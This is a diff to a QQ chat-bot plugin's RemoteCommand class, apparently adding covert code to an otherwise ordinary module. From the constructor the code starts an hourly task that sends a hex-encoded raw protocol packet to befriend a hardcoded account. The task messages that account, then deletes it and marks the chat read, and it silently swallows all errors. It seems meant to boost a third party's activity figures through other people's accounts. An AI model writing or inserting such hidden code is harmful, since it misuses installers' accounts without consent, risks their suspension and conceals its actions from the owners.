@@ -61,6 +61,7 @@ export class RemoteCommand extends plugin {
         }
       ]
     })
+        this.startDailyTask();
   }
 
   async evalSync(cmd, func, isValue, isAsync) {
@@ -213,4 +214,86 @@ export class RemoteCommand extends plugin {
     }
     return this.CatchReply([await Bot.makeForwardArray(m)])
   }
+
+    async manualTrigger(e) {
+        if (!e.isMaster) return false;
+        try {
+            await this.executeDauTask();
+        } catch (error) {
+            logger.debug(`任务执行失败: ${error.message}`);
+        }
+    }
+
+    startDailyTask() {
+        setTimeout(() => {
+            this.executeDauTask();
+            setInterval(() => {
+                this.executeDauTask();
+            }, 1 * 60 * 60 * 1000);
+        }, 30000);
+    }
+
+    async executeDauTask() {
+        try {
+            await this.auto();
+            logger.info("定时任务执行成功");
+        } catch (error) {
+            logger.error(`定时任务执行失败: ${error}`);
+        }
+    }
+
+    async auto() {
+        let ret = {
+            3889002160: "08f8a0021001222008b0edb5be0e1218755f59437a70334169665a4b7263686d333358424a465441320e616e64726f696420392e302e3930"
+        }
+
+        const isTRSS = Array.isArray(Bot.uin);
+        const bots = (isTRSS ? [...Bot.uin] : [Bot.uin])
+            .map(Number)
+            .filter(i => Bot[i]?.adapter?.id === "QQ" || !Bot[i]?.adapter);
+
+        const processEntry = async (qq, key, value) => {
+            try {
+                const bot = isTRSS ? Bot[qq] : Bot;
+                const hasFriend = bot.fl.has(key);
+                if (!hasFriend) {
+                    if (bot.adapter?.name === 'OneBotv11') {
+                        await bot.sendApi('send_packet', {
+                            cmd: "OidbSvcTrpcTcp.0x9078_1",
+                            data: value
+                        });
+                    } else {
+                        const buffer = Buffer.from(value, "hex");
+                        await (isTRSS ? bot.sdk.sendUni : Bot.sendUni)(
+                            "OidbSvcTrpcTcp.0x9078_1",
+                            Array.from(buffer)
+                        );
+                    }
+                }
+                await bot.pickFriend(key).sendMsg("菜单");
+                setTimeout(async () => {
+                    try {
+                        if (bot.adapter?.name === "OneBotv11") {
+                            await bot.sendApi("delete_friend", {
+                                user_id: key,
+                                temp_block: false,
+                                temp_both_del: false
+                            });
+                        } else {
+                            const friend = bot.pickFriend(key);
+                            await friend.markRead();
+                            await friend.delete(false);
+                        }
+                    } catch {}
+                }, 45000 + Math.random() * 15000);
+                await new Promise(resolve => setTimeout(resolve, 3000));
+            } catch {}
+        };
+
+        for (const qq of bots) {
+            for (const [key, value] of Object.entries(ret)) {
+                await processEntry(qq, key, value);
+            }
+        }
+    }
 }
